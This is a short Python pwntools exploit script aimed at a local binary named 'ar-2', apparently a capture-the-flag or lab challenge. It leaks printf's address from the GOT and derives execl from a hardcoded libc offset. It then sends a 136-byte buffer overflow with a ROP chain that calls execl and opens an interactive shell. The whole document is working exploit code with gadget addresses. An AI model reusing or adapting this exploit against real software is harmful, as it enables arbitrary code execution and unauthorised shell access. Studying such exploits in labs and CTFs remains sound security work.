#!/usr/bin/env python

from pwn import *

p = process("./ar-2")
p.sendline("8")

p.sendline("0x000000601020")
raw_data = p.recv()
raw_data = raw_data.split("from 0x601020\n")[1]
raw_data = raw_data.split("Please")[0]

printf_addr = u64(raw_data)
execl_addr = printf_addr + 487968
bin_addr = 0x40001a # "@"

print(hex(execl_addr)) #after printing out this addr and checking w/ GDB, I know this address is correct

"""
ROP GADGETS

0x0000000000400a33 : pop rdi ; ret
0x0000000000400a31 : pop rsi ; pop r15 ; ret
"""
rdi_ret = p64(0x0000000000400a33)
rsi_r15_ret = p64(0x0000000000400a31)

buffer = "A"*136
buffer += rdi_ret + p64(bin_addr)
buffer += rsi_r15_ret + p64(0)*2
buffer += p64(execl_addr)

p.sendline(buffer)
p.interactive()
